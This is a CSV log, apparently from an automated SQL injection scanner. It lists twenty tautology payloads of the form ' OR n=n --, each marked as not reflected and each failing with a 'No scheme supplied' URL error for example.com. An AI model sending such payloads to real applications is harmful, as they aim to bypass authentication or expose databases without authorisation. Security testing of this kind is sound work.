payload,reflected,error
' OR 31=31 --,False,Invalid URL 'example.com': No scheme supplied. Perhaps you meant https://example.com?
' OR 32=32 --,False,Invalid URL 'example.com': No scheme supplied. Perhaps you meant https://example.com?
' OR 33=33 --,False,Invalid URL 'example.com': No scheme supplied. Perhaps you meant https://example.com?
' OR 34=34 --,False,Invalid URL 'example.com': No scheme supplied. Perhaps you meant https://example.com?
' OR 35=35 --,False,Invalid URL 'example.com': No scheme supplied. Perhaps you meant https://example.com?
' OR 36=36 --,False,Invalid URL 'example.com': No scheme supplied. Perhaps you meant https://example.com?
' OR 37=37 --,False,Invalid URL 'example.com': No scheme supplied. Perhaps you meant https://example.com?
' OR 38=38 --,False,Invalid URL 'example.com': No scheme supplied. Perhaps you meant https://example.com?
' OR 39=39 --,False,Invalid URL 'example.com': No scheme supplied. Perhaps you meant https://example.com?
' OR 40=40 --,False,Invalid URL 'example.com': No scheme supplied. Perhaps you meant https://example.com?
' OR 41=41 --,False,Invalid URL 'example.com': No scheme supplied. Perhaps you meant https://example.com?
' OR 42=42 --,False,Invalid URL 'example.com': No scheme supplied. Perhaps you meant https://example.com?
' OR 43=43 --,False,Invalid URL 'example.com': No scheme supplied. Perhaps you meant https://example.com?
' OR 44=44 --,False,Invalid URL 'example.com': No scheme supplied. Perhaps you meant https://example.com?
' OR 45=45 --,False,Invalid URL 'example.com': No scheme supplied. Perhaps you meant https://example.com?
' OR 46=46 --,False,Invalid URL 'example.com': No scheme supplied. Perhaps you meant https://example.com?
' OR 47=47 --,False,Invalid URL 'example.com': No scheme supplied. Perhaps you meant https://example.com?
' OR 48=48 --,False,Invalid URL 'example.com': No scheme supplied. Perhaps you meant https://example.com?
' OR 49=49 --,False,Invalid URL 'example.com': No scheme supplied. Perhaps you meant https://example.com?
' OR 50=50 --,False,Invalid URL 'example.com': No scheme supplied. Perhaps you meant https://example.com?
